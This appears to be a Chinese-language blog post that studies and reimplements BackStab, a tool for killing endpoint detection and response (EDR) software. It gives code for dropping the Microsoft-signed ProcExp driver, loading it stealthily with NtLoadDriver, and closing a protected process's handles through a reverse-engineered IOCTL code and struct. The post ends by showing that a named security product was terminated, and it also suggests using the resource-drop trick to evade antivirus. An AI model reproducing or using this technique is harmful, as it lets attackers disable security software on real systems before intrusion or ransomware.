---
title: EdrKiller
tags: tools
---

# EdrKiller

## 起因

通过阅读 [BackStab](https://github.com/Yaxser/Backstab) 的源码以及简介有感，学习一下该工具的思路

根据 BackStab 的介绍，整个流程为：

> #### OpSec
>
> Here is a quick rundown of what happens
>
> 1. Embedded driver is dropped to disk
> 2. Registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services is created
> 3. The privilege SE_PRIVILEGE_ENABLED is acquired because it is necessary to load the driver
> 4. Driver is loaded using NtLoadDriver to avoid creating a service
> 5. The created Registry key is deleted (service not visible during execution)
> 6. Communication with the driver is via using DeviceIoControl
> 7. For handle enumeration, NtQuerySystemInformation is called
>
> #### What you should also know
>
> 1. The behavior of the tool mimics that of ProcExp. ProcExp drops the driver to the disk, create registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services, calls NtLoadDriver, and then delete the registry key
> 2. You can specify the location to which the driver is dropped and the service name
> 3. When done, the app will unload the driver. The driver is unloaded by first re-creating the registry keys and then calling NtUnloadDriver
> 4. The loaded driver is signed by MS
> 5. The process does not attempt to directly kill protected processes handles, it instructs ProcExp driver to kill them. You won't be accused of attempting to tamper with any processes

简而言之就是加载自带微软官方签名的 ProcExp 驱动，利用其驱动函数做到 Kill EDR 的效果。

## 过程

### ProcEXP 驱动落地

加载 ProcEXP，就需要考虑 ProcEXP.sys 文件如何落地，BackStab 是采用资源文件写入磁盘的方式，落地一个 ProcEXP 文件，然后注册注册表时使用 ProcEXP 的路径，当然还可以直接上传一个 ProcEXP.sys 文件。这里还是复现它的操作：

+ 添加资源文件 –> 导入 ProcEXP.sys

  ![image-20210627190230590](https://gitee.com/tboom_is_here/pic/raw/master/img/image-20210627190230590.png)

  ![image-20210627190242606](https://gitee.com/tboom_is_here/pic/raw/master/img/image-20210627190242606.png)

+ 操作资源文件落地

  这一套其实也是标准流程，利用操作资源的多个 API 达到释放资源的效果

  + 首先用 FindResource 函数确定资源位置

    ```c
    HRSRC FindResourceA(
      HMODULE hModule,	//NULL 表示当前模块或进程
      LPCSTR  lpName,	//MAKEINTRESOURCE(ID)
      LPCSTR  lpType
    );
    ```

  + LoadResource 加载资源到内存中。

    ```c
    HGLOBAL LoadResource(
      HMODULE hModule,
      HRSRC   hResInfo
    );
    ```

  + LockResource 检索指向内存中指定资源的指针。

    ```c
    LPVOID LockResource(
      HGLOBAL hResData
    );
    ```

  + SizeofResource 计算资源大小

    ```
    DWORD SizeofResource(
      HMODULE hModule,
      HRSRC   hResInfo
    );
    ```

  + CreateFile 和 WriteFile 达到创建和写入的目的

（这种方法应该也可以用做免杀）

![image-20210627195746188](https://gitee.com/tboom_is_here/pic/raw/master/img/image-20210627195746188.png)

### 加载驱动

作者在加载驱动这一块做了描述，为了避免创建服务，使用了 NtLoadDriver，但是 NtLoadDriver 是内核态函数，要调用的话就需要使用 ntdll.dll：

```
NT_LOAD_DRIVER NtLoadDriver = (NT_LOAD_DRIVER)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtLoadDriver");
```

NtLoadDriver 函数的参数是注册表，在加载前还需要注册一个注册表，路径为 `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\ProcEXP`

```
status = RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
status = RegSetValueEx(hKey, L"Type", 0, REG_DWORD, (BYTE*)&dwData, sizeof(DWORD));
status = RegSetValueEx(hKey, L"ErrorControl", 0, REG_DWORD, (BYTE*)&dwData, sizeof(DWORD));
status = RegSetValueEx(hKey, L"Start", 0, REG_DWORD, (BYTE*)&dwData, sizeof(DWORD));
status = RegSetValueEx(hKey, L"ImagePath", 0, REG_SZ, (const BYTE*)driverPath, (DWORD)(sizeof(wchar_t) * (wcslen(driverPath) + 1)));
```

![image-20210627211804360](https://gitee.com/tboom_is_here/pic/raw/master/img/image-20210627211804360.png)

此时再调用 NtLoadDriver 加载驱动：

![image-20210628105357376](https://gitee.com/tboom_is_here/pic/raw/master/img/image-20210628105357376.png)

### 连接驱动

ProcEXP驱动已经加载完成后，就需要连接该驱动，以便使用驱动的导出函数 Kill 进程。

```
HANDLE hProcExp = CreateFileA("\\\\.\\PROCEXP152", GENERIC_ALL, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
```

连接使用的 CreateFileA，此 API 连接驱动时，驱动名称格式默认为 `\\\\.\\DeviceName`，这里的 DeviceName 并不是 PROCEXP，通过火绒剑查看：

![image-20210628135833251](https://gitee.com/tboom_is_here/pic/raw/master/img/image-20210628135833251.png)实际连接应该为 PROCEXP152

### 获取保护进程句柄

任务管理器直接关闭 EDR 是无法关闭的：

![image-20210628145917986](https://gitee.com/tboom_is_here/pic/raw/master/img/image-20210628145917986.png)

原因就是该进程有保护进程，所以要想 Kill EDR，就需要找到保护进程，参考[这篇文章](https://www.cnblogs.com/zmlctt/p/3979108.html)，简要了解一下隐藏进程和保护进程的概念。 

使用 DeviceIoControl 获取保护进程句柄：

```
DeviceIoControl(hProcExp, IOCTL_OPEN_PROTECTED_PROCESS_HANDLE, (LPVOID)&ulPID, sizeof(ulPID),&hProtectedProcess,sizeof(HANDLE),&dwBytesReturned,NULL);
```

### 获取保护进程PID下的所有句柄

先是使用了 NtQuerySystemInformation，这个 API 可以检索系统信息，包括系统进程、线程相关，任务管理器使用的就是这个 API

```c
fNtQuerySystemInformation _NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
```

利用这个 API 获取了系统内所有句柄信息，再去与之前保护进程句柄对应的 Pid 进行比较，找到对应的句柄信息，

```c
if (handleInfo.ProcessId == dwPID) 
{
			if (i % 15 == 0)
			{
				DWORD dwProcStatus = 0;
				GetExitCodeProcess(hProcess, &dwProcStatus);
				if (dwProcStatus != STILL_ACTIVE)
				{
					return;
				}
			}
			ProcExpKillHandle(dwPID, handleInfo.Handle);
		}
```

判断成功后会调用 ProcExpKillHandle 函数，这个函数是作者自己写的，目的就是关闭这个进程的句柄以达到关闭进程的目的，也是工具的核心。

但是在这之前还有一个 i % 15 == 0 的判断，这个判断的目的是每隔 15 个 Handle 检查一次进程是不是已经关闭了，这个数字可以随便调，其目的就是为了在已经关闭进程后能停止循环。

### 利用 ProcEXP 驱动发送 关闭句柄指令

ProcExpKillHandle 函数分为两部分，后一部分是通过 DeviceIoControl 发送 IOCTL_CLOSE_HANDLE 指令，前一部分就是针对这个指令所需要的各种参数。

```
DeviceIoControl(hProcExpDevice, IOCTL_CLOSE_HANDLE, (LPVOID)&ctrl, sizeof(PROCEXP_DATA_EXCHANGE), NULL,0,NULL,NULL);
```

DeviceIoControl 的第二个参数是操作的控制代码，也就是调用驱动内函数时的调用代码，BackStab 的作者应该是已经把 ProcEXP.sys 逆完了，已经了解了关闭句柄的控制代码以及所需参数：

```c
#define IOCTL_CLOSE_HANDLE 2201288708

typedef struct _ioControl
{
	ULONGLONG ulPID;
	PVOID lpObjectAddress;
	ULONGLONG ulSize;
	ULONGLONG ulHandle;
} PROCEXP_DATA_EXCHANGE, * PPROCEXP_DATA_EXCHANGE;
```

## 结果

根据上面的过程凑吧凑吧也能凑出一个只有删除功能的 EdrKiller

以火绒举例：

![image-20210629093739324](https://gitee.com/tboom_is_here/pic/raw/master/img/image-20210629093739324.png)

![image-20210629093822512](https://gitee.com/tboom_is_here/pic/raw/master/img/image-20210629093822512.png)